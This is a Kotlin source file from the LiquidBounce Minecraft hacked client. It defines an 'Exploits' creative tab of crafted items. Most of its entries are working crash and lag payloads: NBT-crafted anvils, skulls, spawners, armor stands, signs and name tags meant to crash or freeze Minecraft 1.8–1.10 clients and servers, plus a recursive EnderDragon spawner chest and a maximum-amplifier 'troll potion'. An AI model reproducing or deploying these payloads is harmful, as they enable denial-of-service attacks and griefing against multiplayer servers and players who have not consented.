/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.tabs

import net.ccbluex.liquidbounce.utils.extensions.NBTTagCompound
import net.ccbluex.liquidbounce.utils.extensions.NBTTagList
import net.ccbluex.liquidbounce.utils.extensions.appendTag
import net.ccbluex.liquidbounce.utils.inventory.ItemUtils
import net.ccbluex.liquidbounce.utils.extensions.set
import net.minecraft.creativetab.CreativeTabs
import net.minecraft.init.Blocks
import net.minecraft.init.Items
import net.minecraft.item.Item
import net.minecraft.item.ItemStack

class ExploitsTab : CreativeTabs("Exploits") {

    private val itemStacks by lazy(LazyThreadSafetyMode.NONE) {
        buildList(13) {
            // Create troll potion
            val trollPotion = ItemStack(Items.potionitem)

            trollPotion.itemDamage = 16395

            val trollPotionEffects = NBTTagList {
                for (i in 1..27) {
                    appendTag {
                        this["Amplifier"] = Int.MAX_VALUE
                        this["Duration"] = Int.MAX_VALUE
                        this["Id"] = i
                    }
                }
            }
            trollPotion.setTagInfo("CustomPotionEffects", trollPotionEffects)
            trollPotion.setStackDisplayName("§c§lTroll§6§lPotion")
            this += trollPotion

            // Create kill potion
            val killPotion = ItemStack(Items.potionitem)
            killPotion.itemDamage = 16395
            val effects = NBTTagList {
                appendTag {
                    this["Amplifier"] = 125
                    this["Duration"] = 1
                    this["Id"] = 6
                }
            }
            killPotion.setTagInfo("CustomPotionEffects", effects)
            killPotion.setStackDisplayName("§c§lKill§6§lPotion")
            this += killPotion

            // Create crash anvil for mc 1.8
            val crashAnvil = ItemStack(Blocks.anvil)
            crashAnvil.setStackDisplayName("§8Crash§c§lAnvil §7| §cmc1.8-mc1.8")
            crashAnvil.itemDamage = 16384
            this += crashAnvil
            // Create crashhead for mc 1.10
            val crashHead = ItemStack(Items.skull)
            crashHead.tagCompound = NBTTagCompound {
                this["SkullOwner"] = " "
            }
            crashHead.setStackDisplayName("§8Crash§6§lHead §7| §cmc1.8-mc1.10")
            this += crashHead

            // Add crash spawner
            this += ItemUtils.createItem("mob_spawner 1 0 {BlockEntityTag:{EntityId:\"Painting\"}}")!!.setStackDisplayName("§8Crash§c§lSpawner §7| §cmc1.8-mc1.8")

            // Create crashstand for mc 1.10
            this += ItemUtils.createItem("armor_stand 1 0 {EntityTag:{Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:\"Test\"}}]}}")!!.setStackDisplayName("§8Crash§2§lStand §7| §cmc1.10")

            // Create lag sign
            val lagString = "/(!§()%/§)=/(!§()%/§)=/(!§()%/§)=".repeat(500)

            this += ItemUtils.createItem("sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"$lagString\\\"}\",Text2:\"{\\\"text\\\":\\\"$lagString\\\"}\",Text3:\"{\\\"text\\\":\\\"$lagString\\\"}\",Text4:\"{\\\"text\\\":\\\"$lagString\\\"}\"}}")!!.setStackDisplayName("§8Lag§2§lSign §7| §cmc1.8")

            // Create spawn eggs of special mobs
            this += ItemUtils.createItem("spawn_egg 1 64")!!
            this += ItemUtils.createItem("spawn_egg 1 63")!!
            this += ItemUtils.createItem("spawn_egg 1 53")!!

            // Create lag tag
            this += ItemUtils.createItem("name_tag 1 0 {display:{Name: \"$lagString\"}}")!!

            // Create infinity firework
            this += ItemUtils.createItem("fireworks 1 0 {HideFlags:63,Fireworks:{Flight:127b,Explosions:[0:{Type:0b,Trail:1b,Colors:[16777215,],Flicker:1b,FadeColors:[0,]}]}}")!!.setStackDisplayName("§cInfinity §a§lFirework")

            // Create enderdragon loop item
            this += ItemUtils.createItem("chest 1 0 {BlockEntityTag:{Items:[0:{Slot:0b, id:\"minecraft:mob_spawner\",Count:64b,tag:{BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"EnderDragon\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s}],value:\"Chest\",Lock:\"\"}}")!!.setStackDisplayName("§c§lEnder§c§a§lDragon §bSpawner Chest")
        }
    }

    /**
     * Initialize of exploits tab
     */
    init {
        backgroundImageName = "item_search.png"
    }

    /**
     * Add all items to tab
     *
     * @param itemList list of tab items
     */
    override fun displayAllReleventItems(itemList: MutableList<ItemStack>) {
        itemList += itemStacks
    }

    /**
     * Return icon item of tab
     *
     * @return icon item
     */
    override fun getTabIconItem(): Item = ItemStack(Items.potionitem).item

    /**
     * Return name of tab
     *
     * @return tab name
     */
    override fun getTranslatedTabLabel() = "Exploits"

    /**
     * @return searchbar status
     */
    override fun hasSearchBar() = true
}
